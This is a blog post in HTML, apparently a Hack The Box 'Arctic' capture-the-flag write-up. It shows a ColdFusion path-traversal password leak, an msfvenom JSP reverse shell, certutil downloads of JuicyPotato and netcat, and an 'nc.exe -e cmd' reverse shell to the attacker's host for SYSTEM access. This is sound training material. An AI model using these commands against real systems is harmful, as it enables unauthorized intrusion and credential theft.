@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB: Arctic :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Arctic - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/arctic/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="l0gan334" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB: Arctic">
+<meta property="og:description" content="**HTB | Arctic - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/arctic/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Arctic.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-08 15:42:28 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/arctic/">HTB: Arctic</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-08
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/hacking/">hacking</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/oscp-like/">oscp-like</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/htb/">HTB</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/windows/">windows</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/jsp/">jsp</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/seimpersonateprivilege/">SeImpersonatePrivilege</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/coldfusion/">coldfusion</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Arctic.png"
+    class="post-cover"
+    alt="HTB: Arctic"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Arctic</strong> is a cool HTB machine except for the insane lag in the http server.</p>
+<p>We will be exploiting a <strong>ColdFusion</strong> instance, where we&rsquo;re going to leak admin&rsquo;s password and upload a jsp shell from the admin panel.</p>
+<p>Once inside, abusing <strong>SeImpersonatePrivilege</strong> with <strong>JuicyPotato</strong> we are going to get a shell as system.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>There&rsquo;s three TCP opened ports in the victim machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.77.73 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked up and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-08 15:51 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 15:51
+</span></span><span style="display:flex;"><span>Scanning 10.129.77.73 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.129.77.73
+</span></span><span style="display:flex;"><span>Discovered open port 8500/tcp on 10.129.77.73
+</span></span><span style="display:flex;"><span>sendto in send_ip_packet_sd: sendto<span style="color:#f92672">(</span>5, packet, 44, 0, 10.129.77.73, 16<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>&gt; Operation not permitted
+</span></span><span style="display:flex;"><span>Offending packet: TCP 10.10.14.161:53702 &gt; 10.129.77.73:52994 S ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">37</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">14195</span> iplen<span style="color:#f92672">=</span><span style="color:#ae81ff">44</span>  seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4220139071</span> win<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span> &lt;mss 1460&gt;
+</span></span><span style="display:flex;"><span>Discovered open port 49154/tcp on 10.129.77.73
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 15:51, 26.52s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.77.73
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>8500/tcp  open  fmtp
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 26.61 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131083</span> <span style="color:#f92672">(</span>5.768MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">20</span> <span style="color:#f92672">(</span>880B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We are exporting the result in <strong>grepable format</strong>, which is great to manage with <strong>regex</strong> and get all the ports without needing to type them one by one:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+extractPorts () {
+	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
+	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
+	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
+	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
+	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
+	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+</code></pre>
+  </div>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ extractPorts allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.77.73
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 135,8500,49154
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>With the <strong>-sCV</strong> parameters we will run scripts to enumerate the version and service that each port is running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p135,8500,49154 10.129.77.73 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-08 16:40 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.77.73
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc   Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>8500/tcp  open  http    JRun Web Server
+</span></span><span style="display:flex;"><span>|_http-title: Index of /
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc   Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 139.28 seconds
+</span></span></code></pre></div><p>Ok so there&rsquo;s a couple RPC ports and an HTTP server, so let&rsquo;s check it:</p>
+
+  <img src="/img/arc1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>For some reason it takes quite some time to load so let&rsquo;s get straight to the point.</p>
+<p>Inside the first directory we find all this content:</p>
+
+  <img src="/img/arc2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>Administrator</em> is what calls my attention the most so let&rsquo;s check it:</p>
+
+  <img src="/img/arc3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It turns out to be an instance of <strong>ColdFusion</strong>:</p>
+<h1 id="password-leakage">Password leakage<a href="#password-leakage" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I had never seen this interface so let&rsquo;s start by looking for potential exploits we can use:</p>
+
+  <img src="/img/arc4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>This looks interesting, it&rsquo;s supposed to leak admin&rsquo;s password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python2 coldfusion_shell.py <span style="color:#ae81ff">1</span> 10.129.76.192 <span style="color:#ae81ff">8500</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>------------------------------
+</span></span><span style="display:flex;"><span>trying /CFIDE/wizards/common/_logintowizard.cfm ../../../../../../../../../../../../../../../ColdFusion8/lib/password.properties
+</span></span><span style="display:flex;"><span>Posted: POST /CFIDE/wizards/common/_logintowizard.cfm HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 10.129.76.192
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">94</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>locale<span style="color:#f92672">=</span>%00../../../../../../../../../../../../../../../ColdFusion8/lib/password.properties%00a
+</span></span><span style="display:flex;"><span>Password found after <span style="color:#ae81ff">1</span> attempts
+</span></span><span style="display:flex;"><span>title from server in /CFIDE/wizards/common/_logintowizard.cfm:
+</span></span><span style="display:flex;"><span>------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Wed Mar 22 20:53:51 EET 2017</span>
+</span></span><span style="display:flex;"><span>rdspassword<span style="color:#f92672">=</span>0IA/F<span style="color:#f92672">[[</span>E&gt;<span style="color:#f92672">[</span>$_6&amp; <span style="color:#ae81ff">\Q</span>&gt;<span style="color:#f92672">[</span>K<span style="color:#ae81ff">\=</span>XP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>password<span style="color:#f92672">=</span>2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+</span></span><span style="display:flex;"><span>encrypted<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>------------------------------
+</span></span></code></pre></div><p>It works, apparently it does a directory path traversal and injects a null bite in the url which triggers the website to return the admin&rsquo;s encrypted password.</p>
+<p>Now we have to decrypt it. In this cases <strong>crackstation.net</strong> is very useful:</p>
+
+  <img src="/img/arc5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>There we have it! Now we can login:</p>
+
+  <img src="/img/arc6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><strong><code>Foothold</code></strong></p>
+<p>Inside a <strong>ColdFusion</strong> admin panel we can get to upload a malicious jsp file that we use to get a reverse shell once we open it.</p>
+<p>First we have to find the path where the file should be uploaded to:</p>
+
+  <img src="/img/arc8.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Here we can find the paths being used:</p>
+
+  <img src="/img/arc9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The directory <strong>\CFIDE</strong> was the one we saw the first time we visited the webserver so anything we upload here we will be able to see and open later on.</p>
+<h1 id="but-what-type-of-file-can-we-upload-and-how">But what type of file can we upload and how?<a href="#but-what-type-of-file-can-we-upload-and-how" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>ColdFusion is able to work perfectly with <strong>JSP</strong> files and with <strong>msfvenom</strong> we can create a malicious JSP file that once triggered, will give us a reverse shell.</p>
+<h1 id="generating-the-file-with-msfvenom">Generating the file with msfvenom<a href="#generating-the-file-with-msfvenom" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.161 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">334</span> -o shell.jsp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">1497</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell.jsp
+</span></span></code></pre></div><h1 id="uploading-the-file">Uploading the file<a href="#uploading-the-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We will start by going to <strong>Scheduled Tasks</strong> and schedule a new task:</p>
+
+  <img src="/img/arc7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We&rsquo;re going to put the URL of our webserver offering the file and also the path where we&rsquo;re going to save the file:</p>
+
+  <img src="/img/arc10.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now we have to submit and run the task:</p>
+
+  <img src="/img/arc11.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.76.192 - - <span style="color:#f92672">[</span>08/Jul/2022 17:19:19<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /shell.jsp HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><p>Hopefully the file has been successfully uploaded and we can find it in <strong>\CFIDE</strong>:</p>
+
+  <img src="/img/arc12.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Perfect! Now let&rsquo;s set the listener and open the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ rlwrap nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.76.192.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.76.192:49322.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\C</span>oldFusion8<span style="color:#ae81ff">\r</span>untime<span style="color:#ae81ff">\b</span>in&gt;
+</span></span></code></pre></div><p>I’m using rlwrap with the netcat so I can do things like ^L and using the arrow keys to navigate through the commands I’ve used.</p>
+<p>Inside our user&rsquo;s desktop we can find the <strong>user.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>olis<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>22/03/2017  10:00     &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>22/03/2017  10:00     &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>10/07/2022  08:43                 <span style="color:#ae81ff">34</span> user.txt
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   1.433.407.488 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>type user.txt
+</span></span><span style="display:flex;"><span>0a3ff5c30668c*******************
+</span></span></code></pre></div><p>The first part is done now let&rsquo;s move on to the privesc.</p>
+<h1 id="privilege-escalation"><strong><code>Privilege escalation</code></strong><a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We&rsquo;ll start by enumerating our user:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>arctic	olis
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State
+</span></span><span style="display:flex;"><span>============================= ========================================= ========
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects                     Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a <span style="color:#66d9ef">process</span> working set            Disabled
+</span></span></code></pre></div><p>We have <strong>SeImpersonatePrivilege</strong>, this is amazing for us because we can abuse it and potentially get command execution as <strong>SYSTEM</strong>.</p>
+<p>In order to exploit this we will need to upload the <strong>JuicyPotato.exe</strong> and the <strong>netcat</strong>:</p>
+
+  <img src="/img/arc13.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>certutil.exe <span style="color:#f92672">-f</span> -urlcache -split http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.14.161/JuicyPotato.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  000000  ...
+</span></span><span style="display:flex;"><span>  054e00
+</span></span><span style="display:flex;"><span>CertUtil<span style="color:#960050;background-color:#1e0010">:</span> -URLCache command completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>certutil.exe <span style="color:#f92672">-f</span> -urlcache -split http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.14.161/nc.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  0000  ...
+</span></span><span style="display:flex;"><span>  6e00
+</span></span><span style="display:flex;"><span>CertUtil<span style="color:#960050;background-color:#1e0010">:</span> -URLCache command completed successfully.
+</span></span></code></pre></div><p>Its usage it&rsquo;s simple, we have to specify:</p>
+<ul>
+<li>Type of proccess (-t) or both using <strong>*</strong>.</li>
+<li>Random port (-l)</li>
+<li>Program to execte (-p)</li>
+<li>Arguments for the program (-a)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\JuicyPotato.exe -t * -l 1337 -p <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c whoami&#34;</span>
+</span></span><span style="display:flex;"><span>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>[+] authresult 0
+</span></span><span style="display:flex;"><span>{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] CreateProcessWithTokenW OK
+</span></span></code></pre></div><p>It works! Now we can send us a shell with netcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\JuicyPotato.exe -t * -l 1337 -p <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.161 334&#34;</span>
+</span></span><span style="display:flex;"><span>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>[+] authresult 0
+</span></span><span style="display:flex;"><span>{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] CreateProcessWithTokenW OK
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">❯</span> nc -lvnp 334
+</span></span><span style="display:flex;"><span>Ncat<span style="color:#960050;background-color:#1e0010">:</span> Version 7.92 ( https<span style="color:#960050;background-color:#1e0010">:</span>//nmap.org/ncat )
+</span></span><span style="display:flex;"><span>Ncat<span style="color:#960050;background-color:#1e0010">:</span> Listening on ::<span style="color:#960050;background-color:#1e0010">:</span>334
+</span></span><span style="display:flex;"><span>Ncat<span style="color:#960050;background-color:#1e0010">:</span> Listening on 0.0.0.0<span style="color:#960050;background-color:#1e0010">:</span>334
+</span></span><span style="display:flex;"><span>Ncat<span style="color:#960050;background-color:#1e0010">:</span> Connection from 10.129.76.192.
+</span></span><span style="display:flex;"><span>Ncat<span style="color:#960050;background-color:#1e0010">:</span> Connection from 10.129.76.192<span style="color:#960050;background-color:#1e0010">:</span>49419.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#66d9ef">[Version 6.1.7600]</span>
+</span></span><span style="display:flex;"><span>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;
+</span></span></code></pre></div><p>Perfect! Now we can access the Administrator&rsquo;s Desktop and find the <strong>root.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\Administrator\Desktop&gt;dir
+</span></span><span style="display:flex;"><span> Volume <span style="color:#66d9ef">in</span> drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 5C03-76A8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>22/03/2017  10<span style="color:#960050;background-color:#1e0010">:</span>02     &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>22/03/2017  10<span style="color:#960050;background-color:#1e0010">:</span>02     &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>10/07/2022  08<span style="color:#960050;background-color:#1e0010">:</span>43                 34 root.txt
+</span></span><span style="display:flex;"><span>               1 File(s)             34 bytes
+</span></span><span style="display:flex;"><span>               2 Dir(s)   1.432.272.896 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Administrator\Desktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>0f06029728aec92*****************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/jerry/">
+                <span class="button__text">HTB: Jerry</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
